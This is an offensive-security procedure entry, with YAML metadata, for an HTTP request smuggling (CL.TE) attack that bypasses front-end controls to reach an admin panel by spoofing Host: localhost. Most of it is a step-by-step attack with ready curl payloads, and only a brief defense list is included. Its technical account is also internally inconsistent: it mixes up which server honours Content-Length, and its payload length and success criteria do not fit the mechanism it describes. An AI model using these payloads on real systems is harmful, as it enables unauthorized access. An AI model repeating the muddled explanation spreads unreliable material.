---
id: 41323a3e-b961-4839-b1d2-b16e9f819c93
name: http-request-smuggling-cl-te-to-bypass-front-end-controls
type: procedure
verified: true
submitted: true
created_at: '2020-08-12T03:34:57.581661+00:00'
updated_at: '2023-05-26T18:07:34.415693+00:00'
platforms:
  - Web
tags:
  - '[[tags/Web Applications]]'
  - http-smuggling
  - bypass
  - cl-te
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
commands:
  - '[[commands/curl-normal-admin-access]]'
  - '[[commands/curl-cl-te-smuggle-test]]'
  - '[[commands/curl-cl-te-smuggle-localhost]]'
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# HTTP Request Smuggling CL.TE to Bypass Front-End Controls

## Summary

This procedure demonstrates an HTTP request smuggling attack using the CL.TE (Content-Length and Transfer-Encoding) variant to bypass front-end security controls, such as a web application firewall (WAF) or load balancer that normalizes requests differently from the back-end server. By exploiting inconsistencies in how the front-end and back-end parse requests with both Content-Length and Transfer-Encoding headers, an attacker can inject a smuggled request to access restricted areas like an admin panel, spoofing the Host header as 'localhost' to meet back-end authorization checks.

## Description

HTTP request smuggling occurs when front-end and back-end servers interpret ambiguous HTTP requests differently. In the CL.TE variant, the front-end server uses the Content-Length header to determine the request body length and ignores Transfer-Encoding: chunked, while the back-end treats the request as chunked. This allows an attacker to prepend a zero-length chunk ('0\r\n\r\n') to close the front-end's body parsing early, injecting a second request that the back-end processes. This technique is used here to access an admin panel blocked by the front-end (returning 403), tricking the back-end into seeing a localhost request (bypassing 'Admin interface only available if logged in as Administrator or if requested as localhost'). The attack requires proxying traffic to modify requests and is effective against misconfigured reverse proxies like older NGINX or Apache setups. Prerequisites include network access to the target web application and the ability to intercept/modify HTTP requests.

## Requirements

- Network access to the target web application (e.g., via browser or proxy).
- A proxy tool like [[tools/Burp-Suite]] to intercept and modify requests, or curl for CLI simulation.
- Basic understanding of HTTP headers and chunked encoding.
- Target must have a front-end that ignores Transfer-Encoding and a back-end that processes it, with differing request normalization (e.g., Host header checks).

## Defense

Defensive measures and detection strategies:

- Ensure front-end and back-end servers use consistent HTTP parsing (e.g., disable Transfer-Encoding on front-end or enforce strict header validation).
- Implement WAF rules to detect dual Content-Length and Transfer-Encoding headers (e.g., via ModSecurity CRS).
- Log and monitor for anomalous responses like 401/201 mismatches or unexpected localhost requests from external IPs.
- Use HTTP/2 end-to-end to avoid smuggling vulnerabilities, or normalize requests at the front-end.
- Regularly test with tools like smuggle-vuln or Burp's built-in smuggling scanner.

## Objectives

1. Identify if the target is vulnerable to CL.TE smuggling by observing response discrepancies.
2. Smuggle a request to spoof the Host as 'localhost' and bypass admin access controls.
3. Gain unauthorized access to the admin panel for further enumeration or exploitation.
4. Confirm success by receiving a 201 or successful admin page response.

## Instructions

### Step 1: Intercept and Test Normal Admin Access

**Context**: Begin by sending a standard request to the admin endpoint to confirm it's protected (expect 403 Forbidden). This establishes the baseline and verifies the front-end blocks access.

**Command** ([[commands/curl-normal-admin-access]]):
```bash
curl -i -X GET 'http://target.com/admin' -H 'Host: target.com'
```

> This command sends a simple GET to /admin. The front-end should return 403, denying access due to non-admin or non-localhost origin. If successful, you'll see the 403 response headers and body indicating access denial.

### Step 2: Test for Smuggling Vulnerability with Ignore Header

**Context**: Modify the request to include both Content-Length and Transfer-Encoding headers, prepending a zero chunk to smuggle an injected request. Use an ignore header to probe parsing differences. Expect a 401 response revealing back-end logic (e.g., localhost requirement).

**Command** ([[commands/curl-cl-te-smuggle-test]]):
```bash
curl -i -X POST 'http://target.com/' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6' --data-raw $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nx-Ignore: X\r\n\r\n'
```

> This crafts a smuggled request: The front-end sees Content-Length: 6 (treating the chunked part as body), but the back-end processes the chunked encoding, interpreting the injected GET /admin. Success is indicated by a 401 response with a message like 'Admin interface only available if logged in as Administrator or if requested as localhost', confirming the smuggling works and revealing the bypass condition.

### Step 3: Execute Smuggling to Spoof Localhost and Access Admin

**Context**: Build on the vulnerability by injecting a request with Host: localhost in the smuggled portion. This tricks the back-end into granting access as if the request originated locally.

**Command** ([[commands/curl-cl-te-smuggle-localhost]]):
```bash
curl -i -X POST 'http://target.com/' -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6' --data-raw $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nx-ignore: x\r\n\r\n'
```

> The zero chunk closes the front-end body, allowing the back-end to process the full injected request with spoofed Host: localhost. If vulnerable, expect a 201 Created or 200 OK with the admin panel content, confirming bypass. Verify by checking for admin interface elements in the response body.
